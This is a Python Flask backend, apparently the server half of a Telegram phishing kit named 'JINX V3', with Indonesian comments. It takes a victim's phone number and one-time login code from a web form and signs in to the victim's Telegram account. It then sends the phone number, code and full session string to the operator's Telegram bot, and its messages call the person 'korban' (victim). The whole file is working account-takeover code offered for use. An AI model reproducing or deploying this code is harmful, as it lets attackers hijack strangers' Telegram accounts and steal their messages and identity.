# api/send_code.py
import os
import logging
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeInvalidError, FloodWaitError, SessionPasswordNeededError
import requests

logging.basicConfig(level=logging.DEBUG)
log = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# === ENV VARS (RAILWAY) ===
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# === KIRIM KE BOT ===
def send_bot(msg):
    if not BOT_TOKEN or not CHAT_ID:
        log.error("BOT_TOKEN or CHAT_ID missing!")
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        r = requests.get(url, params={
            'chat_id': CHAT_ID,
            'text': msg,
            'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        }, timeout=15)
        log.info(f"Bot response: {r.status_code}")
        if not r.json().get('ok'):
            log.error(f"Bot error: {r.json()}")
    except Exception as e:
        log.error(f"Bot exception: {e}")

# === MAIN ROUTE ===
@app.route('/send_code', methods=['POST', 'OPTIONS'])
async def handle():
    if request.method == 'OPTIONS':
        return '', 204

    phone = request.form.get('phone')
    code = request.form.get('code')
    action = request.form.get('action', 'send')
    phone_code_hash = request.form.get('hash')

    if not phone:
        return jsonify({'success': False, 'error': 'no phone'}), 400

    log.info(f"Action: {action} | Phone: {phone}")

    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        # === KIRIM / RESEND OTP ===
        if action != 'verify':
            log.info("Sending OTP request...")
            # force_sms=True → SMS (jika nomor baru)
            # force_sms=False → Telegram app (jika akun aktif)
            res = await client.send_code_request(phone, force_sms=True)
            await client.disconnect()

            status = "RESEND" if action == 'resend' else "TARGET MASUK"
            msg = (
                f"*{status}*\n\n"
                f"No: `{phone}`\n"
                f"Hash: `{res.phone_code_hash}`\n"
                f"**OTP masuk ke SMS / Telegram korban — cek app-nya!**"
            )
            send_bot(msg)
            return jsonify({'success': True, 'hash': res.phone_code_hash})

        # === VERIFIKASI OTP ===
        else:
            if not phone_code_hash:
                await client.disconnect()
                return jsonify({'success': False, 'error': 'Missing hash'}), 400

            log.info(f"Verifying OTP: {code}")
            try:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                session_str = StringSession.save(client.session)
                await client.disconnect()

                msg = (
                    f"*TARGET MASUK!*\n\n"
                    f"No: `{phone}`\n"
                    f"OTP: `{code}`\n"
                    f"SESSION:\n||{session_str}||"
                )
                send_bot(msg)
                return jsonify({'success': True, 'session': session_str})

            except PhoneCodeInvalidError:
                await client.disconnect()
                return jsonify({'success': False, 'error': 'Kode OTP salah'}), 400
            except SessionPasswordNeededError:
                await client.disconnect()
                return jsonify({'success': False, 'error': 'Akun punya 2FA'}), 403
            except FloodWaitError as e:
                await client.disconnect()
                return jsonify({'success': False, 'error': f'Tunggu {e.seconds} detik'}), 429

    except Exception as e:
        log.error(f"CRITICAL ERROR: {e}")
        if 'client' in locals():
            try:
                await client.disconnect()
            except:
                pass
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/')
def home():
    return "JINX V3 – FINAL | StringSession | OTP SMS/Telegram | 11 Nov 2025"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
